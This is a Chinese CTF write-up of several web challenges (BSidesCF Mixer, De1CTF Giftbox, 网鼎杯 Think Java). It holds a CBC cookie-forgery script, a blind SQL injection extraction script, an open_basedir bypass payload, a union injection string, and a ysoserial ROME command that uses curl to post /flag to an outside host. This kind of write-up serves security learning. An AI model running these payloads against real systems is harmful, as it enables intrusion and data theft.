前言: 今天是废物的一天，元旦三天还是要玩一下，不要卷了。

## 0x01 [BSidesCF 2019]Mixer

密码web 好题，希望后面可以来复现一波

```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = "https://mixer-f3834380.challenges.bsidessf.net"
action="""?action=login&first_name=A1.00000000000000&last_name=paww"""
r = requests.get(url+action, verify=False, allow_redirects=False)
for c in r.cookies:
    print(c.name, c.value)
    if c.name == "user":
        c.value = c.value[:-32] + c.value[32:64] + c.value[-32:]

resp = requests.get(url, cookies = r.cookies, verify=False, allow_redirects=False)

print resp.text
```

这个题目首先得了解一下CBC加密的方式

分块加密，也就是16byte为一块。也就是exp中的payload要改成

```
{"first_name":"A
1.00000000000000
","last_name":"x
xxx","is_admin":
0}
```

现在就是分别对每一块进行加密，如果我们现在把第二块换到第五块的位置，那么就变成了

```
{"first_name":"A
1.00000000000000
","last_name":"x
xxx","is_admin":
1.00000000000000
0}
```

现在就满足条件了。这也是上面的exp需要表达的意识。

## 0x02 [De1CTF 2019]Giftbox

直接拿着赵总的wp学爆 好吧。conda的python不支持pyopt我也不知道为什么，大家别踩坑就好了。https://www.zhaoj.in/read-6170.html#0x03Giftbox

:recycle:知识点

- sql注入
- php语言特性

:a:解题1 - sql注入

![image-20220103091835125](https://img.dem0dem0.top/images/image-20220103091835125.png)

打开题目是一个zsh的界面。我们发送一个请求之后开始抓包。

![image-20220103091945572](https://img.dem0dem0.top/images/image-20220103091945572.png)

我还以为直接就可以拿到shell了，但是仔细观察请求，发现了一个参数`totp` 吓得我赶忙去百度。

`TOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法`

可以看到这个参数是加密的(废物文学，但是我们必须找到这个参数是从哪里来的，不然包都不能重放。(去找js文件。`new TOTP("GAXG24JTMZXGKZBU",8).genOTP()`所以这个参数我们也就可以自己生成了。

```
totp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)
totp.now()
```

这样就可以输出获得正确的参数。我们继续收集信息。

```python
cd ls cat hey hi hello help clear exit ~ 
```

这是同一个js文件的信息。

![image-20220103092646426](https://img.dem0dem0.top/images/image-20220103092646426.png)

在测试的发现了还有这几条指令，我们发现这里有一个登录点，但是我们不知道账号密码，于是我们先寻找无果。于是经`典sql注入?`

开始fuzz。

![image-20220103093007153](https://img.dem0dem0.top/images/image-20220103093007153.png)

猜测一下后端的语句难道是

```php
$user= select * from users where username=$username;

if($user){
}
else{
}
```

很明显可以开始注入了。

```python
import time
import requests
import pyotp
totp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)
session = requests.session()
url = ""
def sql_injection(mid):
    '''
    :param mid: 输入payload
    :return: 返回是否正确 判断前后夹击的范围
    '''
    time.sleep(0.5)
    payload = f"login admin'/**/and/**/({mid})/**/and/**/'1'='1 123"
    # print(payload)
    a = session.get(url + '/shell.php',
        params={'a':payload,'totp':totp.now()}).text
    # print(a)
    if('password' in a ):
        return  True
    else:
        return  False
def gen_payload():
    '''
    生成payload
    :return:
    '''
    db_payload ="select/**/concat(password)/**/from/**/users"
    res=''
    for x in range(1,64):
        payload = f"ascii(substr(({db_payload}),{x},1))"
        res += chr(half(payload))
        print(res)
    print("[+]" + res)
def half(payload):
    '''
    二分法主体部分
    :param payload:
    :return:
    '''
    low = 0
    high = 126
    while low <= high:
        mid = (low + high) / 2
        mid_num_payload="%s/**/>/**/%d"%(payload,mid)
        if(sql_injection(mid_num_payload)):
            low = mid + 1
        else:
            high = mid -1
    mid_num = int((low + high + 1) / 2)
    return mid_num


def main():
    gen_payload()


if __name__ == '__main__':
    main()
```

buu的记得要设置延时，不然会被你ipban了。

![image-20220103103439593](https://img.dem0dem0.top/images/image-20220103103439593.png)

后面这个命令，我们看到了双引号，所以{$a()}.懂得都懂。

最后绕过open_base

```
chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
```

payload拆分一下就可以了。

## 0x03[网鼎杯 2020 朱雀组]Think Java

:a:jdbc注入

第一步这里的注入是要分成两步的。

![image-20220103110637881](https://img.dem0dem0.top/images/image-20220103110637881.png)

![image-20220103110645071](https://img.dem0dem0.top/images/image-20220103110645071.png)

你注入的语句不能影响他正常的连接的同时还要能够注入数据。

```
myapp?a=1' union select pwd from user; #
```

这也是他们说的无用字符不生效。

```
admin@Rrrr_ctf_asde
```

:b:java反序列化

![image-20220103110834039](https://img.dem0dem0.top/images/image-20220103110834039.png)

登录成功之后不难发现，一串数据。

盲猜这个接口。

![image-20220103110942135](https://img.dem0dem0.top/images/image-20220103110942135.png)

对数据进行了反序列化。然后我们应该对这个数据

https://www.cnblogs.com/h3zh1/p/12914439.html

然后用`ysoserial-master.jar`小何yyds

```
ysoserial用法:以ROME和URLDNS举例
即用ROME(我现在的认知就是他每一种都有不同的作用，比如rome可以命令执行，URLDNS可以进行dns回显)。
```

yyds!

```
java -jar ysoserial-master.jar ROME "curl http://xxx -d @/flag" > dem0.bin
```

第一次使用yso工具解题，做到拿到密码就不会的web废物解决了。

## 0x04 string.strip_tags

`string.strip_tags`可以把php标签进行删除掉。

arjun 爆破参数。

## 0x05 

